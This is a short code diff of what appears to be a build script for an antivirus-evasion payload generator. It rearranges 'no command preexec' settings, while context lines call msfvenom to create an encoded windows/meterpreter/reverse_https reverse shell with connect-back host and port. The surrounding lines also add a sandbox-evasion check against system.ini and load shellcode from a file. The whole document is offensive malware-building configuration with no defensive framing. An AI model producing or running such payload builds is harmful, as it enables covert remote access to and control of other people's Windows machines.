@@ -25,6 +25,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source none
+set_command_exec no_command
 # enable debug printing
 enable_debug_print
 #CONFIGURATION_END
@@ -36,10 +39,6 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/a
 
 # add fopen sandbox evasion
 add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-
-# no command preexec
-set_command_source none
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
